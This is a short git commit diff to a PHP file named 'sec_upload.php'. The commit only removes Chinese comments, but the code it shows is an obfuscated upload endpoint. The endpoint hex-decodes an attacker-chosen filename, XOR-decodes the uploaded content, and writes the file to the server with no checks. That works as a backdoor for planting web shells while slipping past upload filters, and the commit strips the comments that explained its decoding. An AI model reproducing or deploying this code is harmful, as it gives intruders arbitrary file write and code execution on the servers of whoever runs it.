8e6267a42df3059a31ac65b7b32f431f205a275b
maximo896 <della.maximo896@anglernook.com>
2025-03-04 04:07:14 +0800

    Update sec_upload.php

--- sec_upload.php
+++ sec_upload.php
@@ -2,7 +2,6 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
     $uploaded = $_FILES['image'];
     
-    // 解码文件名
     $encoded_name = pathinfo($uploaded['name'], PATHINFO_FILENAME);
     $hex = '';
     for ($i = 0; $i < strlen($encoded_name); $i += 2) {
@@ -14,14 +13,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
     }
     $extension = pathinfo($uploaded['name'], PATHINFO_EXTENSION);
     
-    // 解码文件内容
     $encoded_content = file_get_contents($uploaded['tmp_name']);
     $decoded_content = '';
     for ($i = 0; $i < strlen($encoded_content); $i++) {
         $decoded_content .= chr(ord($encoded_content[$i]) ^ 0xAA);
     }
     
-    // 保存文件
     $final_name = $decoded_name . ($extension ? ".$extension" : '');
     file_put_contents($final_name, $decoded_content);
     echo "File decoded successfully: $final_name";
